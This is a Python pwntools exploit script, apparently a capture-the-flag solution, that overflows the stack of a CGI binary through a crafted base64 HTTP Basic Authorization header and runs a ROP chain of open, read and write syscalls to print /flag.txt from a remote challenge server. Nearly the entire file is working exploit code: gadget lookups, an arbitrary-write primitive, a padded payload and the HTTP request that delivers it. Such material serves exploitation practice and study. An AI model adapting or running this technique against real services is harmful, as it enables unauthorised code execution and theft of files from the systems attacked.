#!/usr/bin/env python3
# pylint: disable=all
from pwn import *
from base64 import b64encode
import requests
import os

# -------------------------- INFO -------------------------- #
# Arch:       amd64-64-little
# RELRO:      Partial RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)
# Stripped:   No

# ------------------------- TARGET ------------------------- #
exe = context.binary = ELF(args.EXE or "index.cgi")
rop = ROP(exe)

# ------------------------- REMOTE ------------------------- #
url = "http://challs.nusgreyhats.org:32367"

# -------------------------- START ------------------------- #
pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
pop_rax = rop.find_gadget(["pop rax", "ret"]).address
pop_rsi = rop.find_gadget(["pop rsi", "ret"]).address
pop_rdx_rbx = rop.find_gadget(["pop rdx", "pop rbx", "ret"]).address
syscall = rop.find_gadget(["syscall", "ret"]).address
arbwrite = 0x000000000040485F  # mov qword ptr [rdi], rax ; ret

payload = b"admin:"
payload += b"A" * 0x112
payload += p64(0x407D10)  # ehdump ./index.cgi
payload += b"B" * 56

# Write flag filepath
payload += p64(pop_rdi)
payload += p64(exe.bss() + 0x500)
payload += p64(pop_rax)
payload += b"/flag.tx"
payload += p64(arbwrite)
payload += p64(pop_rdi)
payload += p64(exe.bss() + 0x508)
payload += p64(pop_rax)
payload += b"t" + b"\x00" * 7
payload += p64(arbwrite)

# Open flag
payload += p64(pop_rax)
payload += p64(2)  # SYS_open
payload += p64(pop_rdi)
payload += p64(exe.bss() + 0x500)  # const char *path
payload += p64(pop_rsi)
payload += p64(0)  # int flags
payload += p64(pop_rdx_rbx)
payload += p64(0) * 2  # mode_t mode
payload += p64(syscall)

# Read flag
payload += p64(pop_rax)
payload += p64(0)  # SYS_read
payload += p64(pop_rdi)
payload += p64(3)  # int fd
payload += p64(pop_rsi)
payload += p64(exe.bss() + 0x600)  # void buf[count]
payload += p64(pop_rdx_rbx)
payload += p64(255)  # size_t count
payload += p64(0)
payload += p64(syscall)

# Write flag
payload += p64(pop_rax)
payload += p64(1)  # SYS_write
payload += p64(pop_rdi)
payload += p64(1)  # int fd
payload += p64(pop_rsi)
payload += p64(exe.bss() + 0x600)  # void buf[count]
payload += p64(pop_rdx_rbx)
payload += p64(255)  # size_t count
payload += p64(0)
payload += p64(syscall)

# Craft base64 payload with "AAAA" block after "=" to trigger
# base64 padding before final block
header = "Basic " + b64encode(payload).decode() + "AAAA"
assert "=" in header

os.environ["HTTP_AUTHORIZATION"] = header

gdbscript = f"""
c
"""

if args.REMOTE:
    resp = requests.get(url=url, headers={"Authorization": header})
    flag = resp.text.replace("\x00", "")
    info("FLAG: %s", flag)
else:
    if args.DBG:
        p = gdb.debug(exe.path, gdbscript=gdbscript)
    else:
        p = process(exe.path)
    p.interactive()
